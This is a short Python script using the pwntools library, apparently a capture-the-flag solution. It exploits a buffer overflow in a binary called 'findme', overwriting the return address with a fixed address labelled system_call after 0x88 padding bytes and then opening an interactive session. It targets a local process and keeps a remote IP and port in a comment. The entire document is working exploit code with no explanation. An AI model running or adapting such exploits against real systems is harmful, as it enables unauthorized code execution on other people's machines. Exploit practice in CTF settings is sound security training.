#!/usr/bin/env python

from pwn import *

e = ELF("./findme")

#p = remote("159.65.13.76", 63003)
p = process("./findme")

system_call = 0x40089c

payload = 'A' * 0x88 + p64(system_call)
p.recvuntil("token:")

p.sendline(payload)
p.interactive()